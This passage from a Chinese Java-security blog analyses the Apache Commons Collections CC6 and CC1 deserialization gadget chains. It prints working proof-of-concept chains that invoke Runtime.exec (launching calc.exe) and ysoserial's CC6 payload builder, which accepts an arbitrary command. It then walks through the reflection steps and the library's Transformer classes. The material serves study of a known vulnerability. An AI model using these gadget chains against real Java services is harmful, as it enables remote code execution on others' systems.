<p>当<code>key</code>不存在时，会去执行我们构造的gadget。随后，会执行<code>super.map.put(key,value)</code>，来存储数据。这也就导致，当我们反序列化的时候是可以在<code>innerMap</code>中找到<code>key</code>的，也就不会执行构造的gadget了。</p>
<p>解决方法便是<code>innerMap.remove()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建LasyMap</span></span><br><span class="line">        Map lazyMap= LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        Map outerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        outerMap.put(tme,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        innerMap.remove(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        objectOutputStream.writeObject(outerMap);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230718232537398.png"
                      alt="image-20230718232537398"
                ></p>
<h2 id="ysoserial的CommonsCollections6"><a href="#ysoserial的CommonsCollections6" class="headerlink" title="ysoserial的CommonsCollections6"></a>ysoserial的CommonsCollections6</h2><p>看一下ysoserial中是如何实现CC6的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Serializable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                    <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">    map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Reflections.setAccessible(f);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Reflections.setAccessible(f2);</span><br><span class="line">    Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Reflections.setAccessible(keyField);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据<code>return map</code>可以看出，在ysoserial中进行序列化和反序列化的类为<code>HashSet</code>。</p>
<p>看一下<code>HashSet.readObject()</code>会发现其最后执行了<code>map.put(e, PRESENT)</code>，这里的<code>map</code>是<code>HashSet</code>的成员变量。要想成功构造gadget，需要e为我们构造的<code>TiedMapEntry</code>，可以看到e通过反序列化流<code>s.readObject()</code>获得。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.readFields();</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                         capacity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line">    loadFactor = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> + size);</span><br><span class="line">    &#125;</span><br><span class="line">    capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">    SharedSecrets.getJavaOISAccess()</span><br><span class="line">                 .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));</span><br><span class="line">    map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下<code>HashSet.writeObject()</code>，会发现e是<code>map.keySet()</code>，在序列化时写入流中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size</span></span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面说过<code>map</code>是<code>HashSet</code>的成员变量。<code>map</code>的类型是<code>HashMap</code>。<code>HashMap.keySet()</code>可以获取<code>HashMap</code>中的所有键的集合</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230719233308457.png"
                      alt="image-20230719233308457"
                ></p>
<p>也就意味着我们构造的类<code>TiedMapEntry</code>应当是<code>HashSet</code>里面<code>HashMap</code>成员变量的一个<code>Key</code>。</p>
<p>在ysoserial中使用下面代码来将<code>TiedMapEntry</code>作为<code>key</code>放到<code>HashMap</code>中。</p>
<pre><code>    HashSet map = new HashSet(1);
    map.add(&quot;foo&quot;);
    Field f = null;
    try &#123;
        f = HashSet.class.getDeclaredField(&quot;map&quot;);
    &#125; catch (NoSuchFieldException e) &#123;
        f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
    &#125;

    Reflections.setAccessible(f);
    HashMap innimpl = (HashMap) f.get(map);

    Field f2 = null;
    try &#123;
        f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
    &#125; catch (NoSuchFieldException e) &#123;
        f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
    &#125;

    Reflections.setAccessible(f2);
    Object[] array = (Object[]) f2.get(innimpl);

    Object node = array[0];
    if(node == null)&#123;
        node = array[1];
    &#125;

    Field keyField = null;
    try&#123;
        keyField = node.getClass().getDeclaredField(&quot;key&quot;);
    &#125;catch(Exception e)&#123;
        keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
    &#125;

    Reflections.setAccessible(keyField);
    keyField.set(node, entry);
</code></pre>
<p>在分析代码前，先补充一个知识：在<code>HashMap</code>中存在内置类<code>Node</code>。<code>Node</code>存在成员变量<code>key</code>和<code>value</code>，当向<code>HashMap</code>中存放数据时，其实是在<code>HashMap</code>中创建了<code>Node</code>，来存放数据。具体实现过程涉及到红黑树，这里暂不研究。</p>
<p>因此，将<code>TiedMapEntry</code>作为<code>key</code>放到<code>HashMap</code>中，需要获取到<code>Node</code>并修改<code>key</code>的值。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230720205702901.png"
                      alt="image-20230720205702901"
                ></p>
<p>接下来分析ysoserial：</p>
<ul>
<li>首先通过反射，获取<code>HashSet</code>中的成员变量<code>map</code>，<code>map</code>是<code>HashMap</code>类</li>
<li>再通过反射获取<code>HashCode</code>中的成员变量<code>table</code>，<code>table</code>是<code>HashMap</code>内置<code>Node</code>类。代码获取到的是<code>Object</code>数组。<code>Object[] array = (Object[]) f2.get(innimpl);</code>这是因为我们创建的<code>HashSet</code>容量为1。当存入foo作为<code>key</code>后，会进行自动扩容。由于<code>Node</code>为内部类，且未通过<code>public</code>进行修饰。因此只能是<code>Object</code>。</li>
<li><code>Node</code>是无序的，因此需要通过判断语句来获取。</li>
<li>最后通过反射来获取<code>Node</code>成员变量<code>key</code>，并将<code>key</code>更改为<code>TiedMapEntry</code>。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HashMap：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230803191813979.png"
                      alt="image-20230803191813979"
                ></p>
<p>HashSet：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230803191659881.png"
                      alt="image-20230803191659881"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections1链</title>
    <url>/2023/07/05/CommonsCollections1%E9%93%BE/</url>
    <content><![CDATA[<p><code>CC1的影响范围为Apache Commons Collections 3.1至3.2.1，需要提前引入对应版本的jar包。</code></p>
<h2 id="CommonsCollections1成因"><a href="#CommonsCollections1成因" class="headerlink" title="CommonsCollections1成因"></a>CommonsCollections1成因</h2><p>这里从p牛简化过的代码来看CC1的成因</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行上述代码，可以成功的在本地弹出计算器</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230705151032484.png"
                      alt="image-20230705151032484"
                ></p>
<p>代码里面涉及到了<code>apache.commons.collections</code>中的一些类，先来了解一下这些类。</p>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>Transformer</code>是一个接口，只有一个待实现的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下都有那些类实现了该接口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230705152301745.png"
                      alt="image-20230705152301745"
                ></p>
<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>实现了<code>Transformer</code>和<code>Serializable</code>接口</p>
<p>看一下其内部方法:</p>
<p><code>getInstance(Object constantToReturn)</code>方法返回<code>ConstantTransformer</code>类的实例</p>
<p><code>ConstantTransformer(Object constantToReturn)</code>为构造方法。获取传递进来的对象，并存储在类中</p>
<p><code>transform(Object input)</code>和<code>getConstant()</code>将构造函数的参数对象返回出去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单来说<code>ConstantTransformer</code>对对象做了一层封装。</p>
<h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>是实现了<code>Transformer</code>接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键。</p>
<p>其内部方法：<code>getInstance()</code>为获取类实例，<code>transform()</code>用来执行命令</p>
<p>构造方法存在两个函数重载。这里我们主要看：<code>InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code></p>
<p>构造方法需要传入三个参数：调用的函数名、函数所需参数类型、传递给函数的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>transform()</code>就是很标准的反射。根据获取的对象调用相应的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p> 主要看<code>transform()</code>方法，将传递进来的<code>object</code>放到实现<code>transformer</code>接口的类中执行，生成新的<code>object</code>，再交给下一个类去执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformedMap</code>的作用是对<code>HashMap</code>进行修饰。用来在存入<code>HashMap</code>之前对<code>key</code>和<code>value</code>进行操作。</p>
